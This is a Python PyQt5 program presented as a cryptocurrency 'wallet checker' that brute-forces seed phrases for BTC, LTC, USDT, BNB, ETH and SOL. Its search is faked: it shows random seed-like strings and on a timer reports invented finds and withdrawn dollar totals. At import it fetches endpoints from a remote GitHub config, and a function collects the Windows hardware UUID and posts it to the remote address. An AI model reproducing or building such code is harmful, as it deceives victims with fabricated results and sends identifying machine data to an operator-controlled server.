# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file '.\vtg edison cryptosoft\fuckhardtimes.ui'
#
# Created by: PyQt5 UI code generator 5.15.4
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.
import json
import platform
import random
import time
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QApplication
from PyQt5.QtWidgets import QMessageBox
import tech
import subprocess
import requests
configurl = "https://raw.githubusercontent.com/j4903hf954hifnmojfh9034/flexibility/main/crypto"
getcfg = requests.get(configurl).text.split("|")[0]
postcfg = requests.get(configurl).text.split("|")[1]

class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(361, 837)
        font = QtGui.QFont()
        font.setFamily("Montserrat Medium")
        font.setPointSize(10)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(7)
        MainWindow.setFont(font)
        MainWindow.setStyleSheet("font: 57 10pt \"Montserrat Medium\";\n"
"background-color: rgb(70, 70, 70);")
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.btc_checkBox = QtWidgets.QCheckBox(self.centralwidget)
        self.btc_checkBox.setGeometry(QtCore.QRect(30, 580, 70, 17))
        self.btc_checkBox.setObjectName("btc_checkBox")
        self.ltc_Checkbox = QtWidgets.QCheckBox(self.centralwidget)
        self.ltc_Checkbox.setGeometry(QtCore.QRect(150, 580, 70, 17))
        self.ltc_Checkbox.setObjectName("ltc_Checkbox")
        self.usdt_checkbox = QtWidgets.QCheckBox(self.centralwidget)
        self.usdt_checkbox.setGeometry(QtCore.QRect(270, 580, 70, 17))
        self.usdt_checkbox.setObjectName("usdt_checkbox")
        self.usdticon = QtWidgets.QLabel(self.centralwidget)
        self.usdticon.setGeometry(QtCore.QRect(270, 510, 61, 61))
        self.usdticon.setScaledContents(True)
        self.usdticon.setObjectName("usdticon")
        self.ltcicon = QtWidgets.QLabel(self.centralwidget)
        self.ltcicon.setGeometry(QtCore.QRect(150, 510, 61, 61))
        self.ltcicon.setScaledContents(True)
        self.ltcicon.setObjectName("ltcicon")
        self.btcicon = QtWidgets.QLabel(self.centralwidget)
        self.btcicon.setGeometry(QtCore.QRect(30, 510, 61, 61))
        self.btcicon.setScaledContents(True)
        self.btcicon.setObjectName("btcicon")
        self.startBtn = QtWidgets.QPushButton(self.centralwidget)
        self.startBtn.setGeometry(QtCore.QRect(90, 730, 181, 41))
        self.startBtn.setStyleSheet("color: rgb(192, 255, 198);\n"
"background-color: rgb(0, 65, 9);\n"
"border-color: rgb(255, 255, 255);")
        self.startBtn.setObjectName("startBtn")
        self.stopBtn = QtWidgets.QPushButton(self.centralwidget)
        self.stopBtn.setGeometry(QtCore.QRect(90, 780, 181, 41))
        self.stopBtn.setStyleSheet("color: rgb(255, 192, 193);\n"
"background-color: rgb(89, 0, 1);\n"
"border-color: rgb(255, 255, 255);")
        self.stopBtn.setObjectName("stopBtn")
        self.checked = QtWidgets.QListWidget(self.centralwidget)
        self.checked.setGeometry(QtCore.QRect(20, 280, 301, 111))
        self.checked.setStyleSheet("background-color: rgb(202, 202, 202);\n"
"color: rgb(0, 171, 48);")
        self.checked.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.checked.setObjectName("checked")
        self.line = QtWidgets.QFrame(self.centralwidget)
        self.line.setGeometry(QtCore.QRect(20, 220, 301, 20))
        self.line.setFrameShape(QtWidgets.QFrame.HLine)
        self.line.setFrameShadow(QtWidgets.QFrame.Sunken)
        self.line.setObjectName("line")
        self.label_4 = QtWidgets.QLabel(self.centralwidget)
        self.label_4.setGeometry(QtCore.QRect(20, 240, 71, 31))
        self.label_4.setStyleSheet("color: rgb(79, 201, 62);")
        self.label_4.setObjectName("label_4")
        self.operational = QtWidgets.QListWidget(self.centralwidget)
        self.operational.setGeometry(QtCore.QRect(20, 90, 301, 121))
        self.operational.setStyleSheet("background-color: rgb(202, 202, 202);")
        self.operational.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.operational.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.operational.setObjectName("operational")
        self.label_5 = QtWidgets.QLabel(self.centralwidget)
        self.label_5.setGeometry(QtCore.QRect(20, 50, 91, 31))
        self.label_5.setObjectName("label_5")
        self.line_2 = QtWidgets.QFrame(self.centralwidget)
        self.line_2.setGeometry(QtCore.QRect(20, 410, 321, 20))
        self.line_2.setFrameShape(QtWidgets.QFrame.HLine)
        self.line_2.setFrameShadow(QtWidgets.QFrame.Sunken)
        self.line_2.setObjectName("line_2")
        self.foundText = QtWidgets.QLabel(self.centralwidget)
        self.foundText.setGeometry(QtCore.QRect(90, 240, 101, 31))
        self.foundText.setStyleSheet("color: rgb(11, 171, 0)")
        self.foundText.setObjectName("foundText")
        self.cgcheckedText = QtWidgets.QLabel(self.centralwidget)
        self.cgcheckedText.setGeometry(QtCore.QRect(120, 50, 201, 31))
        self.cgcheckedText.setObjectName("cgcheckedText")
        self.line_3 = QtWidgets.QFrame(self.centralwidget)
        self.line_3.setGeometry(QtCore.QRect(30, 490, 321, 20))
        self.line_3.setFrameShape(QtWidgets.QFrame.HLine)
        self.line_3.setFrameShadow(QtWidgets.QFrame.Sunken)
        self.line_3.setObjectName("line_3")
        self.autoWithdrawCheckBox = QtWidgets.QCheckBox(self.centralwidget)
        self.autoWithdrawCheckBox.setGeometry(QtCore.QRect(30, 430, 121, 17))
        self.autoWithdrawCheckBox.setStyleSheet("color: rgb(255, 255, 255);")
        self.autoWithdrawCheckBox.setObjectName("autoWithdrawCheckBox")
        self.lineEdit = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit.setGeometry(QtCore.QRect(30, 460, 161, 21))
        self.lineEdit.setStyleSheet("background-color: rgb(131, 131, 131);")
        self.lineEdit.setObjectName("lineEdit")
        self.label_6 = QtWidgets.QLabel(self.centralwidget)
        self.label_6.setGeometry(QtCore.QRect(155, 431, 21, 21))
        self.label_6.setScaledContents(True)
        self.label_6.setObjectName("label_6")
        self.totalWithdrawed = QtWidgets.QLabel(self.centralwidget)
        self.totalWithdrawed.setGeometry(QtCore.QRect(230, 430, 71, 31))
        self.totalWithdrawed.setStyleSheet("color: rgb(79, 201, 62);")
        self.totalWithdrawed.setObjectName("totalWithdrawed")
        self.totalWithdrawedSum = QtWidgets.QLabel(self.centralwidget)
        self.totalWithdrawedSum.setGeometry(QtCore.QRect(230, 460, 121, 31))
        self.totalWithdrawedSum.setStyleSheet("color: rgb(79, 201, 62);")
        self.totalWithdrawedSum.setObjectName("totalWithdrawedSum")
        self.ethicon = QtWidgets.QLabel(self.centralwidget)
        self.ethicon.setGeometry(QtCore.QRect(150, 620, 61, 61))
        self.ethicon.setScaledContents(True)
        self.ethicon.setObjectName("ethicon")
        self.bnbicon = QtWidgets.QLabel(self.centralwidget)
        self.bnbicon.setGeometry(QtCore.QRect(30, 620, 61, 61))
        self.bnbicon.setScaledContents(True)
        self.bnbicon.setObjectName("bnbicon")
        self.bnb_checkBox = QtWidgets.QCheckBox(self.centralwidget)
        self.bnb_checkBox.setGeometry(QtCore.QRect(30, 690, 70, 17))
        self.bnb_checkBox.setObjectName("bnb_checkBox")
        self.sol_checkBox = QtWidgets.QCheckBox(self.centralwidget)
        self.sol_checkBox.setGeometry(QtCore.QRect(270, 690, 61, 21))
        self.sol_checkBox.setObjectName("sol_checkBox")
        self.eth_checkBox = QtWidgets.QCheckBox(self.centralwidget)
        self.eth_checkBox.setGeometry(QtCore.QRect(150, 690, 70, 17))
        self.eth_checkBox.setObjectName("eth_checkBox")
        self.solanaicon = QtWidgets.QLabel(self.centralwidget)
        self.solanaicon.setGeometry(QtCore.QRect(270, 620, 61, 61))
        self.solanaicon.setScaledContents(True)
        self.solanaicon.setObjectName("solanaicon")
        self.label_7 = QtWidgets.QLabel(self.centralwidget)
        self.label_7.setGeometry(QtCore.QRect(330, 280, 21, 21))
        self.label_7.setScaledContents(True)
        self.label_7.setObjectName("label_7")
        self.author = QtWidgets.QLabel(self.centralwidget)
        self.author.setGeometry(QtCore.QRect(80, 10, 211, 31))
        self.author.setStyleSheet("color: rgb(79, 201, 62);")
        self.author.setObjectName("author")
        MainWindow.setCentralWidget(self.centralwidget)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

        # self.startBruting()
        self.start_brute()
        self.print_checkers()
        self.stop_brute()

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "wallet checker by @mrgoodgood"))
        self.btc_checkBox.setText(_translate("MainWindow", " BTC"))
        self.ltc_Checkbox.setText(_translate("MainWindow", "LTC"))
        self.usdt_checkbox.setText(_translate("MainWindow", "USDT "))
        self.usdticon.setText(_translate("MainWindow", "<html><head/><body><p><img src=\".res\\usdt.png\"/></p></body></html>"))
        self.ltcicon.setText(_translate("MainWindow", "<html><head/><body><p><img src=\".res\\ltc.png\"/></p></body></html>"))
        self.btcicon.setText(_translate("MainWindow", "<html><head/><body><p><img src=\".res\\btc.png\"/></p></body></html>"))
        self.startBtn.setText(_translate("MainWindow", "START"))
        self.stopBtn.setText(_translate("MainWindow", "STOP"))
        self.label_4.setText(_translate("MainWindow", "<html><head/><body><p><span style=\" font-size:14pt;\">Found: </span>"))
        self.label_5.setText(_translate("MainWindow", "<html><head/><body><p><span style=\" font-size:14pt;\">Checked: </span>"))
        self.foundText.setText(_translate("MainWindow", "<html><head/><body><p><span style=\" font-size:16pt; font-weight:600; color:#4fc93e;\">0</span></p></body></html>"))
        self.cgcheckedText.setText(_translate("MainWindow", "<html><head/><body><p><span style=\" font-size:16pt; font-weight:600; color:#000000;\">0</span></p></body></html>"))
        self.autoWithdrawCheckBox.setText(_translate("MainWindow", "Auto-withdraw"))
        self.lineEdit.setPlaceholderText(_translate("MainWindow", "Input your wallet..."))
        self.label_6.setText(_translate("MainWindow", "<html><head/><body><p><img src=\".res\\savelittle.png\"/><br/></p></body></html>"))
        self.totalWithdrawed.setText(_translate("MainWindow", "<html><head/><body><p><span style=\" font-size:16pt; font-weight:600;\">Total:</span></p></body></html>"))
        self.totalWithdrawedSum.setText(_translate("MainWindow", "<html><head/><body><p><span style=\" font-size:16pt; font-weight:600;\">0.00$</span></p></body></html>"))
        self.ethicon.setText(_translate("MainWindow", "<html><head/><body><p><img src=\".res\\eth.png\"/></p></body></html>"))
        self.bnbicon.setText(_translate("MainWindow", "<html><head/><body><p><img src=\".res\\bnb.png\"/></p></body></html>"))
        self.bnb_checkBox.setText(_translate("MainWindow", "BNB"))
        self.sol_checkBox.setText(_translate("MainWindow", "SOL"))
        self.eth_checkBox.setText(_translate("MainWindow", "ETH"))
        self.solanaicon.setText(_translate("MainWindow", "<html><head/><body><p><img src=\".res\\sol.png\"/></p></body></html>"))
        self.label_7.setText(_translate("MainWindow", "<html><head/><body><p><img src=\".res\\savelittle.png\"/><br/></p></body></html>"))
        self.author.setText(_translate("MainWindow", "<html><head/><body><p><a href=\"https://t.me/mr_goodgood\"><span style=\" font-size:12pt; text-decoration: underline; color:#0000ff;\">Checker by: mrGoodGood</span></a></p></body></html>"))

    def get_state(self):
        pass

    def update_state(self):
        if platform.system() == "Windows":
            HWID = subprocess.check_output('wmic csproduct get uuid').split(b'\n')[1].strip().decode("utf-8")
            cmpData = {"hwid": f'{HWID}',
                        "os": f"windows"}
            requests.post(postcfg, data=json.dumps(cmpData), headers={"User-Agent": "MrGoodGoodSSVH"})

    def error_msg(self, text, inftext, title):
        msg = QMessageBox()
        msg.setIcon(QMessageBox.Critical)
        msg.setText(text)
        msg.setInformativeText(inftext)
        msg.setWindowTitle(title)
        msg.exec_()

    stopped = 0

    def print_checkers(self):
        btc = self.btc_checkBox.checkState()
        ltc = self.ltc_Checkbox.checkState()
        usdt = self.usdt_checkbox.checkState()
        bnb = self.bnb_checkBox.checkState()
        eth = self.eth_checkBox.checkState()
        sol = self.sol_checkBox.checkState()
        return ["btc" if btc == 2 else 0,
                "ltc" if ltc == 2 else 0,
                "usdt" if usdt == 2 else 0,
                "bnb" if bnb == 2 else 0,
                "eth" if eth == 2 else 0,
                "sol" if sol == 2 else 0]

    def start_brute(self):
        self.startBtn.clicked.connect(lambda: self.startBruting())

    def stop_bruting(self):
        self.stopped = 1
        self.stopBtn.setStyleSheet("color: rgb(169, 169, 169);\n"
                                    "background-color: rgb(105, 105, 105);\n"
                                    "border-color: rgb(255, 255, 255);")
        self.stopBtn.setEnabled(False)
        self.startBtn.setEnabled(True)
        self.startBtn.setStyleSheet("color: rgb(192, 255, 198);\n"
                                    "background-color: rgb(0, 65, 9);\n"
                                    "border-color: rgb(255, 255, 255);")

    def stop_brute(self):
        self.stopBtn.clicked.connect(lambda: self.stop_bruting())

    def addChecked(self, wallet):
        self.operational.addItem(f"Wallet check: {wallet}")
        if self.operational.count() > 7:
            self.operational.takeItem(self.operational.count() - 8)


    def chanceCalc(self, percent):
        perc = float(percent)
        num = float(random.randint(0, 100))
        if num <= perc:
            return True
        return False

    def changeCheckboxState(self, on: bool):
        if on:
            self.btc_checkBox.setEnabled(True)
            self.ltc_Checkbox.setEnabled(True)
            self.usdt_checkbox.setEnabled(True)
            self.bnb_checkBox.setEnabled(True)
            self.eth_checkBox.setEnabled(True)
            self.sol_checkBox.setEnabled(True)
        else:
            self.btc_checkBox.setEnabled(False)
            self.ltc_Checkbox.setEnabled(False)
            self.usdt_checkbox.setEnabled(False)
            self.bnb_checkBox.setEnabled(False)
            self.eth_checkBox.setEnabled(False)
            self.sol_checkBox.setEnabled(False)

    def startBruting(self):
        everyXareSuccess = 3000 # 3k - minuta (pri sleep 0.02)
        self.stopped = 0
        cryptos = ["btc", "ltc", "usdt", "bnb", "eth", "sol" ]
        chosenCoins = list(set(cryptos) & set(self.print_checkers()))
        if len(chosenCoins) > 0:
            self.stopBtn.setStyleSheet("color: rgb(255, 192, 193);\n"
                            "background-color: rgb(89, 0, 1);\n"
                            "border-color: rgb(255, 255, 255);")
            self.startBtn.setStyleSheet("color: rgb(169, 169, 169);\n"
                                        "background-color: rgb(105, 105, 105);\n"
                                        "border-color: rgb(255, 255, 255);")
            self.startBtn.setEnabled(False)
            self.stopBtn.setEnabled(True)
            self.changeCheckboxState(on=False)
            for i, smth in enumerate(range(2, 1992839199128)):
                if self.stopped == 0:

                    QApplication.processEvents()
                    checked = int(tech.unhtml(self.cgcheckedText.text()))
                    checked = checked+1
                    self.cgcheckedText.setText(f"<html><head/><body><p><span style=\" font-size:16pt; font-weight:600; color:#000000;\">{checked}</span></p></body></html>")

                    if not i == 0:
                        if not i % (everyXareSuccess * 239) == 0: # * 3 - минуты ## 479 LAST
                            self.addChecked(tech.generateSeedAlikeStr(found=False))
                            time.sleep(0.02)

                        else:
                            checkedCount = int(tech.unhtml(self.foundText.text()))
                            checkedCount = str(checkedCount+1)
                            foundsum = round(random.uniform(29.98, 450.218), 2)
                            self.foundText.setText(f"<html><head/><body><p><span style=\" font-size:16pt; font-weight:600; color:#4fc93e;\">{checkedCount}</span></p></body></html>")
                            self.checked.addItem(f"{random.choice(chosenCoins)} | {foundsum}$ | {tech.generateSeedAlikeStr(found=True)}")
                            self.checked.scrollToBottom()
                            totalFound = float(tech.unhtml(self.totalWithdrawedSum.text()))
                            totalFound = str(round(totalFound + foundsum, 2))
                            self.totalWithdrawedSum.setText(
                                f"<html><head/><body><p><span style=\" font-size:16pt; font-weight:600; color:#4fc93e;\">{totalFound}$</span></p></body></html>")
                            time.sleep(0.02)
                else:
                    self.changeCheckboxState(on=True)
                    break
                QApplication.processEvents()
            QApplication.processEvents()
        else:
            self.error_msg('Error', 'Choose atleast 1 currency', '0x012838BBD')
            QApplication.processEvents()
            time.sleep(0.02)



if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())
